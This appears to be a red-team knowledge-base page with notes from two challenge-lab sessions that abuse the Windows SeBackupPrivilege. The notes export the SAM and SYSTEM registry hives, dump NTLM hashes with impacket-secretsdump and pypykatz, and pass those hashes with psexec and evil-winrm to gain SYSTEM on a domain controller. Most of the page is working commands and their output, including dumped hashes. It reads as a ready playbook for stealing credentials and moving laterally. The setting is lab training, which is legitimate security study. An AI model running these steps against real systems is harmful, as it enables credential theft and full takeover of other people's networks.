---
title: SeBackup Privilege
parent: Attack Repository
grand_parent: Red Team
nav_order: 252
---

# Example 1
*Notes from the “Zeus” session in Challenge Lab*
https://www.bordergate.co.uk/backup-operator-privilege-escalation/
```powershell
*Evil-WinRM* PS C:\Users\d.chambers\Documents> whoami /priv

Permission Information
----------- ------ -----

Privilege Name                Description                    Status
============================= ============================== =======
SeBackupPrivilege             Backup files and directories  Enabled
```
# Copy SAM
```powershell
*Evil-WinRM* PS C:\Users\d.chambers\Documents> reg save hklm\sam c:\Windows\Tasks\SAM
The operation completed successfully.
```
# Copy SYSTEM
```powershell
*Evil-WinRM* PS C:\Users\d.chambers\Documents> reg save hklm\system c:\Windows\Tasks\SYSTEM
The operation completed successfully.
```

# Download
```powershell
*Evil-WinRM* PS C:\Users\d.chambers\Documents> cd c:\windows\tasks
*Evil-WinRM* PS C:\windows\tasks> dir

    Directory: C:\windows\tasks

Mode                Last Modified         Size Name
----                --------- ----         ------ ----
-a----        2025/08/29  10:36 AM          45056 SAM
-a----        2025/08/29  10:36 AM       16740352 SYSTEM
```

# Cracking
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system's bootKey: 0xf7d6d584287ffb4f29364a67bc20d85b
[*] Dump of local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:650836aac5e819c6afb991606f63f5c3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

```zsh
impacket-psexec -hashes :650836aac5e819c6afb991606f63f5c3 Administrator@192.168.148.158 powershell.exe
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliates 

[*] Searching for shared resources on 192.168.148.158.....
[*] Found writable shared resource ADMIN$
[*] Uploading file hURCWoEF.exe
[*] Opening SVCManager on 192.168.148.158.....
[*] Creating service uuLV on 192.168.148.158.....
[*] Starting service uuLV.....
[!] Press “help” for other shell commands
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
```

```powershell
PS C:\Windows\system32> 
whoami      
PS C:\Windows\system32> whoami
nt authority\system
hostname
PS C:\Windows\system32> hostname
DC01
type \users\administrator\desktop\proof.txt
PS C:\Windows\system32> type \users\administrator\desktop\proof.txt
0583df80a70337b6912e87676a750288
```

---
# Example 2
*Notes from the “Cicada” session in Challenge Lab*
### Reference Links
- [Explanation](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- [Hack_The_Box-Cicada](https://medium.com/@aenoshrajora79/introduction-8bf57544b515)

### 1 Checking Permissions  
Check the current user's permissions after connecting via Evil-Winrm
```bash
whoami /priv
```

### 2 Create a directory and create the SAM and SYSTEM files
```bash
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

### 3 Download the files
```bash
download  sam
download system
```

### 4 Retrieve hashes
```bash
pypykatz registry --sam sam system
```

### 5 Log in using the hashes
```bash
evil-winrm -i cicada.htb -u administrator -H “2b87e7c93a3e8a0ea4a581937016f341”
```